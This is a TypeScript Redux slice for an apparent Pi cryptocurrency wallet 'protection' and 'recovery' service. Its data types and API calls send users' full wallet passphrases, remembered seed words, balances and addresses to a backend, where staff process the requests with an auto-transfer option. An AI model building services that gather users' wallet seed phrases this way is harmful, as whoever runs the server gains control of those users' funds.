import { createSlice, createAsyncThunk } from "@reduxjs/toolkit"
import axiosClient from "@/lib/axios"
import { IUser } from "./auth"

export interface IRequest {
  requestType: "protection" | "recovery"
  email: string
  user: {
    username:string,
    _id:string
  }
  status: "pending" | "processing" | "completed" | "failed"
  country: string
  publicKey: string
  note: string
  createdAt: Date
  updatedAt: Date
  recoveredPassphrase: string
  wordsRemembered: string
  piBalance: number
  piUnlockTime: Date
  walletPassphrase: string
  mainnetWalletAddress: string
  _id: string
  autoTransferEnabled: boolean;
  rejectReason:string;
  rejectedBy?:IUser;
  processedBy?:IUser;
  completedBy?:IUser;
  progress: string;
}

export type CreateRequestPayload = {
    requestType: "protection" | "recovery",
    email: string,
    piBalance?: number
    piUnlockTime?: Date
    walletPassphrase?: string
    mainnetWalletAddress?: string,
    publicKey?: string,
    wordsRemembered?:string;
    note:string;

}

interface RequestState {
  requests: IRequest[]
  loading: boolean
  error: string | null
  currentRequest: IRequest | null
}

const initialState: RequestState = {
  requests: [],
  loading: false,
  error: null,
  currentRequest: null,
}

export const fetchRequests = createAsyncThunk("requests/fetchRequests", async (_, thunkAPI) => {
  try {
    const token = localStorage.getItem("token")
    const response = await axiosClient.get("/requests", {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    })
    return response.data as IRequest[]
  } catch (error: any) {
    return thunkAPI.rejectWithValue(error.message)
  }
})

export const makeRequest = createAsyncThunk(
  "requests/makeRequest",
  async (requestData: CreateRequestPayload, thunkAPI) => {
    try {
      const token = localStorage.getItem("token")
      const response = await axiosClient.post("/requests", requestData, {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      })
      return response.data as IRequest
    } catch (error: any) {
      if (error.response) {
        return thunkAPI.rejectWithValue(error.response.data.message || "Server error occurred")
      } else if (error.request) {
        return thunkAPI.rejectWithValue("No response from server. Please check your connection.")
      } else {
        return thunkAPI.rejectWithValue(error.message || "An unexpected error occurred")
      }
    }
  },
)

export const updateRequestStatus = createAsyncThunk(
  "requests/updateStatus",
  async ({ requestId, action ,rejectReason,amount,passphrase}: { requestId: string; action: string,rejectReason?:string,amount?:number,passphrase?:string }, { rejectWithValue }) => {
    try {
      const token = localStorage.getItem("token")
      const response = await axiosClient.patch(`/requests/${requestId}`, { action ,rejectReason,amount}, {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      })

      return response.data as IRequest
    } catch (error: any) {
      return rejectWithValue(error.message)
    }
  },
)
export const updateRequestProgress = createAsyncThunk(
  "requests/updateProgress",
  async ({ requestId, progress}: { requestId: string; progress: string }, { rejectWithValue }) => {
    try {
      const token = localStorage.getItem("token")
      const response = await axiosClient.patch(`/requests/${requestId}/progress`, { progress }, {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      })

      return response.data as IRequest
    } catch (error: any) {
      return rejectWithValue(error.message)
    }
  },
)

const requestsSlice = createSlice({
  name: "requests",
  initialState,
  reducers: {
    addRequest: (state, action) => {
      state.requests.push(action.payload)
    },
    clearCurrentRequest: (state) => {
      state.currentRequest = null
    },
  },
  extraReducers: (builder) => {
    builder
      // Fetch requests cases
      .addCase(fetchRequests.pending, (state) => {
        state.loading = true
        state.error = null
      })
      .addCase(fetchRequests.fulfilled, (state, action) => {
        state.loading = false
        state.requests = action.payload
      })
      .addCase(fetchRequests.rejected, (state, action) => {
        state.loading = false
        state.error = action.payload as string
      })

      .addCase(makeRequest.pending, (state) => {
        state.loading = true
        state.error = null
      })
      .addCase(makeRequest.fulfilled, (state, action) => {
        state.loading = false
        state.currentRequest = action.payload
        state.requests.push(action.payload)
      })
      .addCase(makeRequest.rejected, (state, action) => {
        state.loading = false
        state.error = action.payload as string
      })
      .addCase(updateRequestStatus.fulfilled, (state, action) => {
        const index = state.requests.findIndex(request => request._id === action.payload._id);

        if (index !== -1) {
          state.requests[index].status = action.payload.status; 
        }
      })
      .addCase(updateRequestProgress.fulfilled, (state, action) => {
        const index = state.requests.findIndex(request => request._id === action.payload._id);

        if (index !== -1) {
          state.requests[index].progress = action.payload.progress; 
        }
      })
  },
})

export const { addRequest, clearCurrentRequest } = requestsSlice.actions

export default requestsSlice.reducer

